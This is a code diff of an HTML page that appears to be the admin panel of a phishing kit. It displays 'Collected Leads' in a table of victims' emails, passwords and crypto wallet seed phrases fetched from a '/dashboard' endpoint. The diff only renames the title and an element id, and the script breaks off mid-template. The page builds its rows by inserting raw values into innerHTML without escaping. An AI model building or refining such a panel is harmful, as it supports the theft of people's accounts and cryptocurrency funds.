@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Dashboard</title>
+    <title>Leads</title>
     <style>
         body { font-family: sans-serif; background: #f4f7f9; padding: 20px; }
         table { width: 100%; border-collapse: collapse; background: white; }
@@ -10,20 +10,18 @@
     </style>
 </head>
 <body>
-    <h1>Leads</h1>
+    <h1>Collected Leads</h1>
     <table>
         <thead>
-            <tr>
-                <th>Email</th><th>Pass</th><th>Wallet/Phrase</th><th>Date</th>
-            </tr>
+            <tr><th>Email</th><th>Pass</th><th>Wallet/Phrase</th><th>Date</th></tr>
         </thead>
-        <tbody id="body"></tbody>
+        <tbody id="leads"></tbody>
     </table>
     <script>
         async function load() {
             const res = await fetch('/dashboard');
             const data = await res.json();
-            const body = document.getElementById('body');
+            const body = document.getElementById('leads');
             data.forEach(l => {
                 body.innerHTML += `<tr>
                     <td>${l.email}</td><td>${l.password}</td>
